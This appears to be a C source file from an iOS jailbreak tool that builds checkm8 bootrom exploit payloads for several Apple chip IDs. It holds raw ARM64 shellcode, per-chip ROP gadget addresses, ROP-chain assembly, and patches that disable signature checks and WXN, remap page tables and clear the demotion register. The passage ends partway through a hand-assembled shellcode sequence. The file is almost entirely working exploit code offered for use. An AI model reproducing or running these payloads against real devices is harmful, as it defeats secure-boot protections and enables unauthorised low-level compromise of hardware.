
#include <io/iousb.h>
#include <common/payload.h>
#include <asm64.h>
#include <dfu.h>

unsigned char overwrite[64];
unsigned char buf[MAX_PAYLOAD_SIZE];

static unsigned char checkm8_arm64[] = {
    0xfd, 0x7b, 0xbf, 0xa9, 0xfd, 0x03, 0x00, 0x91, 0x40, 0x05, 0x00, 0x58,
    0x1f, 0x04, 0x00, 0xf1, 0x41, 0x01, 0x00, 0x54, 0x20, 0x05, 0x00, 0x58,
    0x00, 0x04, 0x40, 0xa9, 0x02, 0x03, 0x00, 0x10, 0x43, 0x10, 0x40, 0xa9,
    0x03, 0x10, 0x00, 0xa9, 0x23, 0x10, 0x00, 0xa9, 0x43, 0x10, 0x41, 0xa9,
    0x03, 0x10, 0x01, 0xa9, 0x23, 0x10, 0x01, 0xa9, 0x40, 0x04, 0x00, 0x58,
    0x00, 0x04, 0x00, 0x91, 0x01, 0x00, 0x40, 0x39, 0xc1, 0xff, 0xff, 0x35,
    0xa1, 0x02, 0x00, 0x10, 0x22, 0x0c, 0x40, 0xa9, 0x02, 0x0c, 0x00, 0xa9,
    0x60, 0x03, 0x00, 0x58, 0x81, 0x03, 0x00, 0x58, 0x20, 0x00, 0x3f, 0xd6,
    0x81, 0x03, 0x00, 0x58, 0x20, 0x00, 0x00, 0x39, 0x1f, 0x75, 0x08, 0xd5,
    0x9f, 0x3f, 0x03, 0xd5, 0xdf, 0x3f, 0x03, 0xd5, 0xfd, 0x7b, 0xc1, 0xa8,
    0xc0, 0x03, 0x5f, 0xd6, 0x09, 0x02, 0x19, 0x00, 0x01, 0x01, 0x05, 0x80,
    0xfa, 0x09, 0x04, 0x00, 0x00, 0x00, 0xfe, 0x01, 0x00, 0x00, 0x07, 0x21,
    0x01, 0x0a, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x20, 0x50, 0x57, 0x4e, 0x44, 0x3a, 0x5b, 0x63, 0x68, 0x65, 0x63, 0x6b,
    0x6d, 0x38, 0x5d, 0x00, 0x1f, 0x20, 0x03, 0xd5, 0x01, 0x00, 0xd0, 0xba,
    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xd0, 0xba, 0x00, 0x00, 0x00, 0x00,
    0x03, 0x00, 0xd0, 0xba, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0xd0, 0xba,
    0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0xd0, 0xba, 0x00, 0x00, 0x00, 0x00
};
static unsigned int checkm8_arm64_len = 216;

static unsigned char patch_ttbr_page[] = {
    0x80, 0x05, 0x00, 0x58, 0xa1, 0x05, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9,
    0x1c, 0x00, 0x00, 0x14, 0x81, 0x05, 0x00, 0x58, 0xa2, 0x05, 0x00, 0x58,
    0xc3, 0x05, 0x00, 0x58, 0x24, 0x68, 0x62, 0xf8, 0x05, 0x00, 0xec, 0xd2,
    0x86, 0x00, 0x25, 0x8a, 0x46, 0x00, 0x00, 0xb4, 0x84, 0x00, 0x05, 0xaa,
    0x86, 0x00, 0x79, 0x92, 0x46, 0x00, 0x00, 0xb4, 0x84, 0x00, 0x79, 0xd2,
    0x24, 0x68, 0x22, 0xf8, 0x86, 0x01, 0x80, 0xd2, 0x44, 0x42, 0x38, 0xd5,
    0x9f, 0x00, 0x06, 0xeb, 0xe0, 0x00, 0x00, 0x54, 0x04, 0x10, 0x38, 0xd5,
    0x86, 0x00, 0x6e, 0x92, 0x26, 0x01, 0x00, 0xb4, 0x84, 0x00, 0x6e, 0xd2,
    0x04, 0x10, 0x18, 0xd5, 0x06, 0x00, 0x00, 0x14, 0x04, 0x10, 0x3e, 0xd5,
    0x86, 0x00, 0x6e, 0x92, 0x66, 0x00, 0x00, 0xb4, 0x84, 0x00, 0x6e, 0xd2,
    0x04, 0x10, 0x1e, 0xd5, 0xdf, 0x3f, 0x03, 0xd5, 0xbf, 0x3f, 0x03, 0xd5,
    0x1f, 0x75, 0x08, 0xd5, 0x1f, 0x87, 0x08, 0xd5, 0x23, 0x02, 0x00, 0x58,
    0x83, 0x00, 0x00, 0xb5, 0x9f, 0x3f, 0x03, 0xd5, 0xdf, 0x3f, 0x03, 0xd5,
    0xc0, 0x03, 0x5f, 0xd6, 0x1f, 0x87, 0x0e, 0xd5, 0x9f, 0x3f, 0x03, 0xd5,
    0xdf, 0x3f, 0x03, 0xd5, 0xfc, 0xff, 0xff, 0x17, 0x01, 0x00, 0xd0, 0xba,
    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xd0, 0xba, 0x1f, 0x20, 0x03, 0xd5,
    0x03, 0x00, 0xd0, 0xba, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0xd0, 0xba,
    0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0xd0, 0xba, 0x00, 0x00, 0x00, 0x00
};
static unsigned int patch_ttbr_page_len = 216;

static unsigned char disable_wxn[] = {
    0xe1, 0x07, 0x61, 0xb2, 0x22, 0x00, 0x00, 0x8b, 0x21, 0x94, 0x18, 0x91,
    0x41, 0x00, 0x03, 0xf9, 0xbf, 0x3f, 0x03, 0xd5, 0x81, 0x01, 0x80, 0xd2,
    0x40, 0x42, 0x38, 0xd5, 0x1f, 0x00, 0x01, 0xeb, 0xc0, 0x00, 0x00, 0x54,
    0xa0, 0x01, 0x82, 0xd2, 0x00, 0x10, 0x18, 0xd5, 0x9f, 0x3f, 0x03, 0xd5,
    0xdf, 0x3f, 0x03, 0xd5, 0x05, 0x00, 0x00, 0x14, 0xa0, 0x01, 0x82, 0xd2,
    0x00, 0x10, 0x1e, 0xd5, 0x9f, 0x3f, 0x03, 0xd5, 0xdf, 0x3f, 0x03, 0xd5,
    0xc0, 0x03, 0x5f, 0xd6
};
static unsigned int disable_wxn_len = 76;

static unsigned char demotion_bin[] = {
    0x01, 0x00, 0x40, 0xb9, 0x21, 0x78, 0x1f, 0x12, 0x01, 0x00, 0x00, 0xb9,
    0x9f, 0x3f, 0x03, 0xd5, 0xdf, 0x3f, 0x03, 0xd5, 0xc0, 0x03, 0x5f, 0xd6
};
static unsigned int demotion_bin_len = 24;

// TODO
unsigned char checkm8_A7[] = {
    0xfd, 0x7b, 0xbf, 0xa9, 0xfd, 0x03, 0x00, 0x91, 0x00, 0x00, 0x80, 0xd2,
    0x1f, 0x04, 0x00, 0xf1, 0x41, 0x01, 0x00, 0x54, 0xe0, 0x09, 0x00, 0x58,
    0x00, 0x04, 0x40, 0xa9, 0x22, 0x08, 0x00, 0x10, 0x43, 0x10, 0x40, 0xa9,
    0x03, 0x10, 0x00, 0xa9, 0x23, 0x10, 0x00, 0xa9, 0x43, 0x10, 0x41, 0xa9,
    0x03, 0x10, 0x01, 0xa9, 0x23, 0x10, 0x01, 0xa9, 0x00, 0x09, 0x00, 0x58,
    0x00, 0x04, 0x00, 0x91, 0x01, 0x00, 0x40, 0x39, 0xc1, 0xff, 0xff, 0x35,
    0xc1, 0x07, 0x00, 0x10, 0x22, 0x0c, 0x40, 0xa9, 0x02, 0x0c, 0x00, 0xa9,
    0x20, 0x08, 0x00, 0x58, 0x41, 0x08, 0x00, 0x58, 0x20, 0x00, 0x3f, 0xd6,
    0x41, 0x08, 0x00, 0x58, 0x20, 0x00, 0x00, 0x39, 0x40, 0x08, 0x00, 0x18,
    0x1f, 0x04, 0x00, 0x71, 0x21, 0x01, 0x00, 0x54, 0x21, 0x08, 0x00, 0x58,
    0x20, 0x00, 0x40, 0xb9, 0x1f, 0x00, 0x00, 0x72, 0x60, 0x04, 0x00, 0x54,
    0x20, 0x00, 0x40, 0xb9, 0x00, 0x78, 0x1f, 0x12, 0x20, 0x00, 0x00, 0xb9,
    0x1f, 0x00, 0x00, 0x14, 0x60, 0x07, 0x00, 0x58, 0x81, 0x07, 0x00, 0x18,
    0x01, 0x00, 0x00, 0xb9, 0x80, 0x07, 0x00, 0x58, 0xa1, 0x07, 0x00, 0x18,
    0x01, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x91, 0x61, 0x07, 0x00, 0x18,
    0x01, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x91, 0x61, 0x06, 0x00, 0x18,
    0x01, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x91, 0xc1, 0x06, 0x00, 0x18,
    0x01, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x91, 0x81, 0x06, 0x00, 0x18,
    0x01, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x91, 0x41, 0x05, 0x00, 0x18,
    0x01, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x91, 0xe1, 0x04, 0x00, 0x18,
    0x01, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x91, 0x81, 0x04, 0x00, 0x18,
    0x01, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x91, 0x21, 0x04, 0x00, 0x18,
    0x01, 0x00, 0x00, 0xb9, 0x1f, 0x75, 0x08, 0xd5, 0x9f, 0x3f, 0x03, 0xd5,
    0xdf, 0x3f, 0x03, 0xd5, 0xfd, 0x7b, 0xc1, 0xa8, 0xc0, 0x03, 0x5f, 0xd6,
    0x09, 0x02, 0x19, 0x00, 0x01, 0x01, 0x05, 0x80, 0xfa, 0x09, 0x04, 0x00,
    0x00, 0x00, 0xfe, 0x01, 0x00, 0x00, 0x07, 0x21, 0x01, 0x0a, 0x00, 0x00,
    0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x50, 0x57, 0x4e,
    0x44, 0x3a, 0x5b, 0x63, 0x68, 0x65, 0x63, 0x6b, 0x6d, 0x38, 0x5d, 0x00,
    0x58, 0x6b, 0x08, 0x80, 0x01, 0x00, 0x00, 0x00, 0xdc, 0x6c, 0x08, 0x80,
    0x01, 0x00, 0x00, 0x00, 0xec, 0xbf, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x62, 0x05, 0x08, 0x80, 0x01, 0x00, 0x00, 0x00, 0x41, 0x41, 0x41, 0x41,
    0x1f, 0x20, 0x03, 0xd5, 0x00, 0xa0, 0x02, 0x0e, 0x02, 0x00, 0x00, 0x00,
    0xe4, 0x54, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x1f, 0x20, 0x03, 0xd5,
    0x1f, 0x20, 0x03, 0xd5, 0xb4, 0x54, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x21, 0x00, 0x80, 0x52, 0xe1, 0x9f, 0x02, 0x39, 0xe1, 0xa7, 0x02, 0x39,
    0xe1, 0xab, 0x02, 0x39
};
unsigned int checkm8_A7_len = 424;

static unsigned char rop_cb[MAX_ROP_SIZE];

static size_t callback_size=0;

static callback_t *callback;

static void cb_init(void)
{
    
    if(callback) {
        callback_t *cb;
        while(callback->next != NULL) {
            cb = callback->next;
            free(callback);
            callback = cb;
        }
        callback = NULL;
    }
    if(!callback) {
        callback = malloc(sizeof(callback_t));
        callback->next = NULL;
    }
}

static void rop_callback(uint64_t arg0, uint64_t arg1)
{
    callback_t *cb = callback;
    while(1) {
        if(cb->next == NULL) {
            cb->arg0 = arg0;
            cb->arg1 = arg1;
            cb->next = malloc(sizeof(callback_t));
            cb->next->next = NULL;
            return;
        }
        cb = cb->next;
    };
}

static int make_rop_callbacks(unsigned char* buf, uint64_t func_gadget, uint64_t address)
{
    callback_t *cb = callback;
    unsigned char block1[MAX_BLOCK_SIZE];
    unsigned char block2[MAX_BLOCK_SIZE];
    size_t block1_len = 0;
    size_t block2_len = 0;
    
    unsigned char data[MAX_BLOCK_SIZE*2];
    size_t len = 0;
    
    int count = 0;
    while(cb->next != NULL) {
        count++;
        cb = cb->next;
    };
    cb = callback;
    
    for(int i=0;i<count;i+=5) {
        memset(&data,   '\0', MAX_BLOCK_SIZE*2);
        memset(&block1, '\0', MAX_BLOCK_SIZE);
        memset(&block2, '\0', MAX_BLOCK_SIZE);
        block1_len = 0;
        block2_len = 0;
        
        for(int j=0;j<5;j++) {
            address += 0x10;
            if(j==4)
                address += 0x50;
            if((i+j) < (count-1)) {
                if(cb->next == NULL)
                    return -1;
                *(uint64_t*)(block1+block1_len) = func_gadget;  block1_len+=8;
                *(uint64_t*)(block1+block1_len) = address;      block1_len+=8;
                *(uint64_t*)(block2+block2_len) = cb->arg1;     block2_len+=8;
                *(uint64_t*)(block2+block2_len) = cb->arg0;     block2_len+=8;
                cb = cb->next;
            } else if ((i+j) == (count-1)) {
                if(cb->next == NULL)
                    return -1;
                *(uint64_t*)(block1+block1_len) = func_gadget;  block1_len+=8;
                *(uint64_t*)(block1+block1_len) = 0;            block1_len+=8;
                *(uint64_t*)(block2+block2_len) = cb->arg1;     block2_len+=8;
                *(uint64_t*)(block2+block2_len) = cb->arg0;     block2_len+=8;
                cb = cb->next;
            } else {
                *(uint64_t*)(block1+block1_len) = 0; block1_len+=8;
                *(uint64_t*)(block1+block1_len) = 0; block1_len+=8;
            }
        }
        
        if(block1_len > MAX_BLOCK_SIZE ||
           block2_len > MAX_BLOCK_SIZE)
            return -1;
        memcpy(data, block1, block1_len);
        memcpy(data+block1_len, block2, block2_len);
        
        if(len+block1_len+block2_len > MAX_ROP_SIZE)
            return -1;
        memcpy(buf+len, data, block1_len+block2_len);
        len += (block1_len+block2_len);
    }
    
    callback_size = len;
    return 0;
}

int payload_gen(io_client_t client, checkra1n_payload_t* payload, bool eclipsa)
{
    /* payload offsets
     *  0x000-0x400: FREE
     *  0x400: VROM_PAGE_OFFSET
     *  0x410-0x600: FREE
     *  0x600: SRAM_PAGE_OFFSET
     *  0x608: SRAM_PAGE_OFFSET (remapped)
     *  0x610-0x800: FREE
     */
    int disable_wxn_offset = 0x200;
    int demotion_offset = 0x280;
    int sigcheck_patch_offset = 0x620;
    int patch_ttbr_page_offset = 0x630;
    int checkm8_arm64_offset = 0x720;
    
    int overwrite_size = 0;
    
    memset(&overwrite, '\0', 64);
    memset(&buf, '\0', 2048);
    memset(&rop_cb, '\0', MAX_ROP_SIZE);
    cb_init();
    
    uint64_t load_address = 0;
    uint64_t sram_base = 0;
    
    uint64_t nop_gadget = 0;
    uint64_t func_gadget = 0;
    uint64_t ret_gadget = 0;
    uint64_t enter_critical_section = 0;
    uint64_t exit_critical_section = 0;
    uint64_t write_ttbr0 = 0;
    uint64_t tlbi = 0;
    
    uint64_t PATCH_ADDR = 0;
    uint64_t PATCH_VALUE = 0;
    uint64_t TTBR0_BASE = 0;
    uint64_t TTBR0_OFFSET = 0;
    bool otherTLBI = false;
    
    bool set_USBDescriptors = false;
    uint64_t gUSBDescriptors = 0;
    uint64_t gUSBSerialNumber = 0;
    uint64_t usb_create_string_descriptor = 0;
    uint64_t gUSBSRNMStringDescriptor = 0;
    uint64_t gDemotionRegister = 0;
    
    bool isA8 = false;
    uint64_t SYNOPSYS_ROUTINE_ADDR = 0;
    uint64_t IO_BUFFER_ADDR = 0;
    uint64_t ARCH_TASK_TRAMP_ADDR = 0;
    
    uint32_t PWND_STR0 = 0x4e575020; // ' PWN'
    uint32_t PWND_STR1 = 0x695b3a44; // 'D:[i'
    uint32_t PWND_STR2 = 0x646e7770; // 'pwnd'
    uint32_t PWND_STR3 = 0x005d7265; // 'er]\x00'
    
    if(client->isDemotion == true) {
        PWND_STR1 = 0x645b3a44; // 'D:[d'
        PWND_STR2 = 0x746f6d65; // 'emot'
        PWND_STR3 = 0x005d6465; // 'ed]\x00'
    }
    
    if(client->devinfo.cpid == 0x8010) {
        load_address = 0x1800b0000;
        sram_base = 0x180000000;
        
        nop_gadget = 0x10000CC6C;
        func_gadget = 0x10000CC4C;
        ret_gadget = 0x10000015c;
        enter_critical_section = 0x10000A4B8;
        exit_critical_section = 0x10000A514;
        write_ttbr0 = 0x1000003E4;
        tlbi = 0x100000434;
        PATCH_ADDR = 0x1000074ac;
        PATCH_VALUE = 0xd2800000;
        TTBR0_OFFSET = 0xA0000;
        TTBR0_BASE = sram_base + TTBR0_OFFSET;
        otherTLBI = false;
        set_USBDescriptors = false;
        gUSBDescriptors = 0x180088A30;
        gUSBSerialNumber = 0x180083CF8;
        usb_create_string_descriptor = 0x10000D150;
        gUSBSRNMStringDescriptor = 0x1800805DA;
        gDemotionRegister = 0x2102bc000;
    } else if(client->devinfo.cpid == 0x8011) {
        load_address = 0x1800b0000;
        sram_base = 0x180000000;
        
        nop_gadget = 0x10000CD0C;
        func_gadget = 0x10000CCEC;
        ret_gadget = 0x100000148;
        enter_critical_section = 0x10000a658;
        exit_critical_section = 0x10000a6a0;
        write_ttbr0 = 0x1000003F4;
        tlbi = 0x100000444;
        PATCH_ADDR = 0x100007630;
        PATCH_VALUE = 0xd2800000;
        TTBR0_OFFSET = 0xA0000;
        TTBR0_BASE = sram_base + TTBR0_OFFSET;
        otherTLBI = false;
        set_USBDescriptors = false;
        gUSBDescriptors = 0x180088948;
        gUSBSerialNumber = 0x180083D28;
        usb_create_string_descriptor = 0x10000D234;
        gUSBSRNMStringDescriptor = 0x18008062A;
        gDemotionRegister = 0x2102bc000;
    } else if(client->devinfo.cpid == 0x8015) {
        load_address = 0x18001C000;
        sram_base = 0x180000000;
        
        nop_gadget = 0x10000A9C4;
        func_gadget = 0x10000A9AC;
        ret_gadget = 0x100000148;
        enter_critical_section = 0x10000f958;
        exit_critical_section = 0x10000f9a0;
        write_ttbr0 = 0x10000045C;
        tlbi = 0x1000004AC;
        PATCH_ADDR = 0x10000624c;
        PATCH_VALUE = 0xd2800000;
        TTBR0_OFFSET = 0xC000;
        TTBR0_BASE = sram_base + TTBR0_OFFSET;
        otherTLBI = false;
        set_USBDescriptors = false;
        gUSBDescriptors = 0x180008528;
        gUSBSerialNumber = 0x180003A78;
        usb_create_string_descriptor = 0x10000AE80;
        gUSBSRNMStringDescriptor = 0x1800008FA;
        gDemotionRegister = 0x2352BC000;
    } else if(client->devinfo.cpid == 0x8000 || client->devinfo.cpid == 0x8003) {
        load_address = 0x180380000;
        sram_base = 0x180000000;
        
        nop_gadget = 0x10000de34;
        func_gadget = 0x10000de14;
        ret_gadget = 0x10000de3c;
        enter_critical_section = 0x10000b458;
        exit_critical_section = 0x10000b4bc;
        //write_ttbr0 = 0x1000003a4;
        //tlbi = 0x1000003f4;
        PATCH_ADDR = 0x10000812C;
        PATCH_VALUE = 0xd2800000;
        TTBR0_OFFSET = 0xC8000;
        TTBR0_BASE = sram_base + TTBR0_OFFSET;
        otherTLBI = true;
        set_USBDescriptors = false;
        gUSBDescriptors = 0x1800877E0;
        gUSBSerialNumber = 0x180087958;
        usb_create_string_descriptor = 0x10000E354;
        gUSBSRNMStringDescriptor = 0x1800807DA;
        gDemotionRegister = 0x2102BC000;
        
        SYNOPSYS_ROUTINE_ADDR = 0x100006718;
        IO_BUFFER_ADDR = 0x18010D500;
        ARCH_TASK_TRAMP_ADDR = 0x10000D998;
    } else if(client->devinfo.cpid == 0x8960) {
        // TODO
        load_address = 0x180380000;
        //sram_base = 0x180000000;
        //
        //enter_critical_section = 0x100008e70;
        //enter_critical_section = 0x100008ecc;
        //PATCH_ADDR = 0x100005BE8;
        //PATCH_VALUE = 0xd2800000;
        //TTBR0_OFFSET = 0xC5000;
        //TTBR0_BASE = sram_base + TTBR0_OFFSET;
        //otherTLBI = true;
        //set_USBDescriptors = false;
        //gUSBDescriptors = 0x180086B58;
        //gUSBSerialNumber = 0x180086CDC;
        //usb_create_string_descriptor = 0x10000BFEC;
        //gUSBSRNMStringDescriptor = 0x180080562;
        //gDemotionRegister = 0x20E02A000;
    } else {
        ERROR("failed to find offsets");
        return -1;
    }
    
    if(eclipsa == false) {
        if(client->devinfo.checkm8_flag & CHECKM8_A7) {
            // TODO
            *(uint64_t*)(overwrite+0x20) = load_address;
            overwrite_size = 64;
            
            memcpy(buf, checkm8_A7, checkm8_A7_len);
            *(uint32_t*)(buf+0x140) = PWND_STR0;
            *(uint32_t*)(buf+0x144) = PWND_STR1;
            *(uint32_t*)(buf+0x148) = PWND_STR2;
            *(uint32_t*)(buf+0x14c) = PWND_STR3;
            *(uint64_t*)(buf+0x170) = client->isDemotion;
            
        } else {
            *(uint64_t*)(overwrite+0x20) = nop_gadget;
            *(uint64_t*)(overwrite+0x28) = load_address;
            *(uint64_t*)(overwrite+0x30) = 0xf7f6f5f4f3f2f1f0;
            *(uint64_t*)(overwrite+0x38) = 0xfffefdfcfbfaf9f8;
            overwrite_size = 64;
            
            if(client->devinfo.checkm8_flag & CHECKM8_A9X_A11) {
                // pre-A9 does not use custom pagetable
                *(uint64_t*)(buf+VROM_PAGE_OFFSET) = 0x1000006a5;       // 0x100000000
                *(uint64_t*)(buf+SRAM_PAGE_OFFSET) = 0x60000180000625;  // 0x180000000
                *(uint64_t*)(buf+SRAM_PAGE_OFFSET+8) = 0x1800006a5;     // 0x182000000 -> 0x180000000
            }
            
            // rop_callbacks
            rop_callback(enter_critical_section, 0);
            // pre-A9 does not have wxn
            if(client->devinfo.checkm8_flag & CHECKM8_A9X_A11) {
                rop_callback(write_ttbr0, load_address);
                rop_callback(tlbi, 0);
                rop_callback(load_address + PAGESIZE + disable_wxn_offset, TTBR0_OFFSET);
                rop_callback(write_ttbr0, TTBR0_BASE);
                rop_callback(tlbi, 0);
            }
            if(client->isDemotion != true) {
                rop_callback(load_address + patch_ttbr_page_offset, 0);
                rop_callback(load_address + sigcheck_patch_offset, 0);
            } else {
                rop_callback(load_address + demotion_offset, gDemotionRegister);
                rop_callback(ret_gadget, 0);
            }
            rop_callback(load_address + checkm8_arm64_offset, 0);
            rop_callback(exit_critical_section, 0);
            rop_callback(ret_gadget, 0);
            
            make_rop_callbacks(rop_cb, func_gadget, load_address);
            if(callback_size > MAX_ROP_SIZE ||
               callback_size + 0x20 > MAX_PAYLOAD_SIZE ||
               disable_wxn_offset + disable_wxn_len > MAX_PAYLOAD_SIZE) {
                ERROR("failed to make payload: overflow");
                return -1;
            }
            
            memcpy(buf + 0x20, rop_cb, callback_size);
            if(client->devinfo.checkm8_flag & CHECKM8_A9X_A11) {
                memcpy(buf + disable_wxn_offset, disable_wxn, disable_wxn_len);
            }
            
            
            if(demotion_offset + demotion_bin_len > MAX_PAYLOAD_SIZE ||
               sigcheck_patch_offset + patch_ttbr_page_len > MAX_PAYLOAD_SIZE ||
               checkm8_arm64_offset + checkm8_arm64_len > MAX_PAYLOAD_SIZE) {
                ERROR("failed to make payload: overflow");
                return -1;
            }
            
            memcpy(buf + demotion_offset, demotion_bin, demotion_bin_len);
            memcpy(buf + sigcheck_patch_offset, patch_ttbr_page, patch_ttbr_page_len);
            memcpy(buf + checkm8_arm64_offset, checkm8_arm64, checkm8_arm64_len);
            
            *(uint64_t*)(buf+sigcheck_patch_offset+0xb0) = PATCH_ADDR;
            *(uint64_t*)(buf+sigcheck_patch_offset+0xb8) = PATCH_VALUE;
            *(uint64_t*)(buf+sigcheck_patch_offset+0xc0) = TTBR0_BASE;
            *(uint64_t*)(buf+sigcheck_patch_offset+0xc8) = VROM_PAGE_OFFSET;
            *(uint64_t*)(buf+sigcheck_patch_offset+0xd0) = otherTLBI;
            
            *(uint32_t*)(buf+checkm8_arm64_offset+0x9c) = PWND_STR0;
            *(uint32_t*)(buf+checkm8_arm64_offset+0xa0) = PWND_STR1;
            *(uint32_t*)(buf+checkm8_arm64_offset+0xa4) = PWND_STR2;
            *(uint32_t*)(buf+checkm8_arm64_offset+0xa8) = PWND_STR3;
            
            *(uint64_t*)(buf+checkm8_arm64_offset+0xb0) = set_USBDescriptors;
            *(uint64_t*)(buf+checkm8_arm64_offset+0xb8) = gUSBDescriptors;
            *(uint64_t*)(buf+checkm8_arm64_offset+0xc0) = gUSBSerialNumber;
            *(uint64_t*)(buf+checkm8_arm64_offset+0xc8) = usb_create_string_descriptor;
            *(uint64_t*)(buf+checkm8_arm64_offset+0xd0) = gUSBSRNMStringDescriptor;
        }
        
        payload->over1 = overwrite;
        payload->over1_len = overwrite_size;
        
    } else {
        // A8/A8X/A9 only
        if(!(client->devinfo.checkm8_flag & CHECKM8_A8_A9)) {
            ERROR("this mode is not supported");
            return -1;
        }
        dfu_overwrite_t overwrite;
        void *shc;
        memset(&overwrite, '\0', sizeof(overwrite));
        
        // 0x7ff's eclipsa style
        // original: https://github.com/0x7ff/eclipsa
        // create task
        overwrite.synopsys_task.id = 5;
        strcpy(overwrite.synopsys_task.name, "usb");
        overwrite.synopsys_task.magic_1 = TASK_MAGIC_1;
        overwrite.synopsys_task.stack_len = TASK_STACK_MIN;
        overwrite.synopsys_task.routine = SYNOPSYS_ROUTINE_ADDR;
        overwrite.synopsys_task.stack_base = IO_BUFFER_ADDR + offsetof(dfu_overwrite_t, fake_task);
        overwrite.synopsys_task.ret_waiters_list.prev = overwrite.synopsys_task.ret_waiters_list.next = overwrite.synopsys_task.stack_base + offsetof(dfu_task_t, queue_list);
        
        overwrite.heap_block.prev_sz = sizeof(overwrite.synopsys_task) / sizeof(overwrite.heap_block) + 1;
        overwrite.heap_block.this_sz = overwrite.synopsys_task.stack_len / sizeof(overwrite.heap_block) + 2;
        
        overwrite.fake_task.id = 6;
        overwrite.fake_task.irq_dis_cnt = 1;
        overwrite.fake_task.state = TASK_RUNNING;
        overwrite.fake_task.magic_1 = TASK_MAGIC_1;
        strcpy(overwrite.fake_task.name, "ipwnder");
        shc = overwrite.fake_task.arch.shc;
        
        overwrite.fake_task.arg = 0;
        int i=0;
        
        // _main:
        *(uint32_t*)(shc+i) = 0xa9bf7bfd; i+=4; // stp   x29, x30, [sp, #-0x10]!
        *(uint32_t*)(shc+i) = 0x910003fd; i+=4; // mov   x29, sp
        
        *(uint32_t*)(shc+i) = 0x58000700; i+=4; // ldr   x0, =gUSBSerialNumber
        
        // _find_zero_loop:
        *(uint32_t*)(shc+i) = 0x91000400; i+=4; // add   x0, x0, #1
        *(uint32_t*)(shc+i) = 0x39400001; i+=4; // ldrb  w1, [x0]
        *(uint32_t*)(shc+i) = 0x35ffffc1; i+=4; // cbnz  w1, _find_zero_loop
        *(uint32_t*)(shc+i) = 0x100005e1; i+=4; // adr   x1, PWND_STRING
        *(uint32_t*)(shc+i) = 0xa9400c22; i+=4; // ldp   x2, x3, [x1]
        *(uint32_t*)(shc+i) = 0xa9000c02; i+=4; // stp   x2, x3, [x0]
        *(uint32_t*)(shc+i) = 0x58000620; i+=4; // ldr   x0, =gUSBSerialNumber
        *(uint32_t*)(shc+i) = 0x58000641; i+=4; // ldr   x1, =usb_create_string_descriptor
        *(uint32_t*)(shc+i) = 0xd63f0020; i+=4; // blr   x1
        *(uint32_t*)(shc+i) = 0x58000641; i+=4; // ldr   x1, =gUSBSRNMStringDescriptor
        *(uint32_t*)(shc+i) = 0x39000020; i+=4; // strb  w0, [x1]
        *(uint32_t*)(shc+i) = 0x58000840; i+=4; // ldr   x0, =demote_flag
        *(uint32_t*)(shc+i) = 0xf100041f; i+=4; // cmp   x0, #1
        *(uint32_t*)(shc+i) = 0x54000121; i+=4; // bne   _eclipsa
        
        // _demotion:
        *(uint32_t*)(shc+i) = 0x58000621; i+=4; // ldr   x1, =gDemotionRegister
        *(uint32_t*)(shc+i) = 0xb9400020; i+=4; // ldr   w0, [x1]
        *(uint32_t*)(shc+i) = 0x7200001f; i+=4; // tst   w0, #1
        *(uint32_t*)(shc+i) = 0x54000380; i+=4; // beq   _end
        *(uint32_t*)(shc+i) = 0xb9400020; i+=4; // ldr   w0, [x1]
        *(uint32_t*)(shc+i) = 0x121f7800; i+=4; // and   w0, w0, #0xfffffffe
        *(uint32_t*)(shc+i) = 0xb9000020; i+=4; // str   w0, [x1]
        *(uint32_t*)(shc+i) = 0x14000018; i+=4; // b     _end
        
        // _eclipsa:
        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0xd50343df; i+=4; // nop (a8) / msr   daifset, #0x3
        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0xd5033fdf; i+=4; // nop (a8) / isb
        
        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0x58000520; i+=4; // nop (a8) / ldr   x0, =VROM_PAGE_TABLE_ADDR
        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0xf940000a; i+=4; // nop (a8) / ldr   x10, [x0]
        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0xb24b054a; i+=4; // nop (a8) / orr   x10, x10, #0x60000000000000
        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0x9278f94a; i+=4; // nop (a8) / and   x10, x10, #0xffffffffffffff7f
        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0xf900000a; i+=4; // nop (a8) / str   x10, [x0]
        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0xd5033f9f; i+=4; // nop (a8) / dsb   sy
        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0xd50e871f; i+=4; // nop (a8) / tlbi  alle3
        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0xd5033f9f; i+=4; // nop (a8) / dsb   sy
        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0xd5033fdf; i+=4; // nop (a8) / isb
        
        *(uint32_t*)(shc+i) = 0x52ba5009; i+=4; // mov   w9, #0xd2800000
        *(uint32_t*)(shc+i) = 0x58000433; i+=4; // ldr   x19, =PATCH_ADDR
        *(uint32_t*)(shc+i) = 0xb9000269; i+=4; // str   w9, [x19]
        
        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0x9249f54a; i+=4; // nop (a8) / and   x10, x10, #0xff9fffffffffffff
        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0xb279014a; i+=4; // nop (a8) / orr   x10, x10, #0x80
